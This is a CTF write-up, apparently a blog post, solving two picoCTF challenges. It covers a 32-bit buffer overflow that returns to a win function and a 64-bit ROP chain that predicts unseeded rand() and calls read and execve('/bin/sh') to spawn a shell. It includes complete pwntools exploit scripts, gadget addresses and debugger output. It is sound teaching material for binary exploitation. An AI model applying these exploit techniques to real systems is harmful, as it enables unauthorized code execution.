---
layout: post
title: Back to Basics - picoCTF buffer overflow 1 & picoCTF Guessing Game 1
tags: [CTF, pwn]
---
Tools like `gef` and `pwntools` are great, but it's time to learn the basic again. This time we'll look at two basic pwning challenges, one x86 and one x64.

## x86 Example - buffer overflow 1
> Control the return address
> 
> Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/251/vuln). You can view source [here](https://artifacts.picoctf.net/c/251/vuln.c). And connect with it using `nc saturn.picoctf.net 53012`

### Source Code
```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
A very simple buffer overflow challenge. There's a `win` function that prints us the flag. The target is to overwrite the return address.

### Attack
Normally we use `gef`'s `pattern create`, let it crash and find where the saved `eip` is. This time let's take a look at the disassembly and compare the result with the pattern method.
```
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x08049281 <+0>:     endbr32 
   0x08049285 <+4>:     push   ebp
   0x08049286 <+5>:     mov    ebp,esp
   0x08049288 <+7>:     push   ebx
   0x08049289 <+8>:     sub    esp,0x24
   0x0804928c <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049291 <+16>:    add    ebx,0x2d6f
   0x08049297 <+22>:    sub    esp,0xc
   0x0804929a <+25>:    lea    eax,[ebp-0x28]
   0x0804929d <+28>:    push   eax
   0x0804929e <+29>:    call   0x8049050 <gets@plt>
   0x080492a3 <+34>:    add    esp,0x10
   0x080492a6 <+37>:    call   0x804933e <get_return_address>
   0x080492ab <+42>:    sub    esp,0x8
   0x080492ae <+45>:    push   eax
   0x080492af <+46>:    lea    eax,[ebx-0x1f9c]
   0x080492b5 <+52>:    push   eax
   0x080492b6 <+53>:    call   0x8049040 <printf@plt>
   0x080492bb <+58>:    add    esp,0x10
   0x080492be <+61>:    nop
   0x080492bf <+62>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080492c2 <+65>:    leave  
   0x080492c3 <+66>:    ret    
End of assembler dump.
```
So before `gets`, our stack is `0x24+0xc=0x30` bytes. `gets`' parameter is on the stack, which is the value of `eax`, `ebp-0x28`.

Remember that a `call` instruction equals to `push eip+x` `jmp addr`, so the saved `eip` will be at `ebp+4`. `0x28+0x4=44`, so 44 bytes will take us to the saved `eip`. How about the pattern approach?
```
gef➤  info frame
Stack level 0, frame at 0xffffc934:
 eip = 0x6161616c; saved eip = 0x6161616d
 called by frame at 0xffffc938
 Arglist at 0xffffc92c, args: 
 Locals at 0xffffc92c, Previous frame's sp is 0xffffc934
 Saved registers:
  eip at 0xffffc930
gef➤  pattern search $eip
[+] Searching for '$eip'
[+] Found at offset 44 (little-endian search) likely
[+] Found at offset 41 (big-endian search)
```
We have the same result. Replace the last 4 bytes of input with the address of `win` and we get the flag.
```python
from pwn import *

# io = remote('saturn.picoctf.net', 52544)
io = process('./vuln')
io.sendline(b'A'*44+p32(0x80491f6))
io.interactive()
```
```
❯ python3 ./solve.py
[+] Starting local process './vuln': pid 31630
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{test}[*] Got EOF while reading in interactive
```

## x64 Example - Guessing Game 1
> I made a simple game to show off my programming skills. See if you can beat it! [vuln](https://jupiter.challenges.picoctf.org/static/6ff916d2bb51444a179ffef1213a9bf7/vuln) [vuln.c](https://jupiter.challenges.picoctf.org/static/6ff916d2bb51444a179ffef1213a9bf7/vuln.c) [Makefile](https://jupiter.challenges.picoctf.org/static/6ff916d2bb51444a179ffef1213a9bf7/Makefile) `nc jupiter.challenges.picoctf.org 51462`

### Source Code
`Makefile` tells us this is a x64 binary.
```makefile
all:
	gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln2 vuln.c

clean:
	rm vuln
```
There's a buffer overflow in `win`, but it is protected by `rand()`.
```c
long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}
```

### Attack
This time no flag is read into the memory, so we have to spawn a shell. There are usually two ways to spawn a shell, either by shellcode or by rop. The binary is compiled with NX enabled so only roping is possible.

First let's deal with `rand()`. The first `fgets` is not vulnerable because of the length limit. There's no way to skip it. However, there's no `srand()` before `rand()` is called. Remember that `rand()` is not actually random, and `stdlib` states that
> If no seed value is provided, the `rand()` function is automatically seeded with a value of 1.

So we can abuse this to get the first `rand()` result. We need only one number because once we have control over `rip`, we can return to `win` if 360 bytes are not enough. Write a little program to get it.
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  printf("%d\n", rand() % 100);
  return 0;
}
```
```
❯ gcc ./test.c -o test
❯ ./test
83
```
The answer is `84` because, well, the challenge binary asks us `rand()+1`.

Next find the offset to `rip`. Take a look at the disassembled `win` function.
```
gef➤  disass win
Dump of assembler code for function win:
   0x0000000000400c40 <+0>:     push   rbp
   0x0000000000400c41 <+1>:     mov    rbp,rsp
   0x0000000000400c44 <+4>:     sub    rsp,0x70
   0x0000000000400c48 <+8>:     lea    rdi,[rip+0x92478]        # 0x4930c7
   0x0000000000400c4f <+15>:    mov    eax,0x0
   0x0000000000400c54 <+20>:    call   0x410010 <printf>
   0x0000000000400c59 <+25>:    mov    rdx,QWORD PTR [rip+0x2b9b48]        # 0x6ba7a8 <stdin>
   0x0000000000400c60 <+32>:    lea    rax,[rbp-0x70]
   0x0000000000400c64 <+36>:    mov    esi,0x168
   0x0000000000400c69 <+41>:    mov    rdi,rax
   0x0000000000400c6c <+44>:    call   0x410a10 <fgets>
   0x0000000000400c71 <+49>:    lea    rax,[rbp-0x70]
   0x0000000000400c75 <+53>:    mov    rsi,rax
   0x0000000000400c78 <+56>:    lea    rdi,[rip+0x9245b]        # 0x4930da
   0x0000000000400c7f <+63>:    mov    eax,0x0
   0x0000000000400c84 <+68>:    call   0x410010 <printf>
   0x0000000000400c89 <+73>:    nop
   0x0000000000400c8a <+74>:    leave  
   0x0000000000400c8b <+75>:    ret
```
The address of our input is stored in `rdi` (the first parameter), which is `rbp-0x70`. Therefore the offset is `0x70+0x8=120`.

Finally let's build our rop chain. Use `ROPGadget --binary ./vuln --ropchain` to see if there are gadgets we need. We have to have control over `rax` (syscall number), `rdi` (1st parameter), `rsi` (2nd), `rdx` (3rd). Also we need `syscall` to make a syscall.
```
[+] Gadget found: 0x4163f4 pop rax ; ret
[+] Gadget found: 0x400696 pop rdi ; ret
[+] Gadget found: 0x410ca3 pop rsi ; ret
[+] Gadget found: 0x44a6b5 pop rdx ; ret
[+] Gadget found: 0x40137c syscall
```
Now let's build our rop chain. We need to write `/bin/sh` into some writable memory area, so `read` is needed. Since the binary called `fgets` before, we have `read` in it. We can use `vmmap` in gdb to find some writable memory area. Remember don't use an address with `0x00` in it if possible.
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00000000400000 0x000000004b7000 0x00000000000000 r-x /home/nick/coding/ctf/pwn/guessing-game-1/vuln
0x000000006b7000 0x000000006bd000 0x000000000b7000 rw- /home/nick/coding/ctf/pwn/guessing-game-1/vuln
0x000000006bd000 0x000000006e1000 0x00000000000000 rw- [heap]
0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]
0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]
0x007ffffffdd000 0x007ffffffff000 0x00000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
gef➤  x/40x 0x6b7000
0x6b7000:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7010:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7020:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7030:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7040:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7050:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7060:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7070:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7080:       0x00000000      0x00000000      0x00000000      0x00000000
0x6b7090:       0x00000000      0x00000000      0x00000000      0x00000000
```
`0x6b7010` is picked. Now look for `read` and `win`
```
gef➤  info address read
Symbol "read" is at 0x44a6a0 in a file compiled without debugging.
gef➤  info address win
Symbol "win" is at 0x400c40 in a file compiled without debugging.
```
Finally the rop chain will be `read(0, 0x607010, 9)` and then `exceve("/bin/sh", NULL, NULL)`. However this is too long if the two chains are combined. Therefore at the end of the first chain we return to `win` and we'll have another 360 bytes to use.
```python
from pwn import *

# gadgets
pop_rax = 0x4163f4
pop_rdi = 0x400696
pop_rsi = 0x410ca3
pop_rdx = 0x44a6b5

# functions
win = 0x400c40
read = 0x44a6a0
syscall = 0x40137c

# writable
writable = 0x6b7010

io = process('./vuln')
io.sendlineafter(b'guess?\n', b'84')
io.recvuntil(b'Name? ')
# read(0, writable, 9)
payload  = b'A'*120
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(writable)
payload += p64(pop_rdx)
payload += p64(9)
payload += p64(read)
# return to win after this
payload += p64(win)
io.sendline(payload)

log.info(f'Length: {len(payload)}')

sleep(1)
io.sendline(b'/bin/sh\x00')

io.recvuntil(b'Name? ')
# make syscall: execve(writable, NULL, NULL)
payload  = b'A'*120
payload += p64(pop_rax)
payload += p64(0x3b) # 59: execve
payload += p64(pop_rdi)
payload += p64(writable)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)
io.sendline(payload)
log.info(f'Length: {len(payload)}')

io.interactive()
```
```
❯ python3 ./mysolve.py
[+] Starting local process './vuln': pid 40128
[*] Length: 184
[*] Length: 192
[*] Switching to interactive mode
Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf4cA

$ ls
Makefile  input  mysolve.py  solve.py  test  test.c  vuln  vuln.c
```

## Reference
- [https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames#Standard_Entry_Sequence](https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames#Standard_Entry_Sequence)
- [https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions)
- [https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9](https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9)